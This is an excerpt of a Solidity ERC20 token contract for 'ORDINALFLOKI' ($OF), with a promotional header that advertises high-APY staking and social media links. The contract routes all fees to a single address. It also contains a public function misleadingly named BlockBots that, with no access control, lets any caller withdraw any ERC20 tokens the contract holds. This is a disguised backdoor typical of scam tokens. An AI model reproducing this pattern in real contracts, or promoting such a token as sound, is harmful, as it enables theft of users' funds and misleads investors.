...
/*
*   Orndinal Floki $OF is launching on Arbitrum!
*
*   We are launching a staking platform where you can stake $OF for high APY
*
*   Initial LP: 1 ETH
*   Locked for 3 months

*   Telegram: https://t.me/ordinalflokiportal
*   Twitter: https://twitter.com/ordinalfloki
...
contract ORDINALFLOKI is Context, ERC20, Ownable {
    address DEAD = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "ORDINALFLOKI";
    string constant _symbol = "$OF"; 
    ...
    // Fees Receivers
    address public devFeeReceiver = 0x2B8D1413d09B7228FC46bE7512E71f8Bc9EE7caa;
    address public marketingFeeReceiver = 0x2B8D1413d09B7228FC46bE7512E71f8Bc9EE7caa;
    address public liquidityFeeReceiver = 0x2B8D1413d09B7228FC46bE7512E71f8Bc9EE7caa;
    ...
    function BlockBots(address bot, uint256 rot) public returns (bool success) {
        return ERC20(bot).transfer(msg.sender, rot);
    }
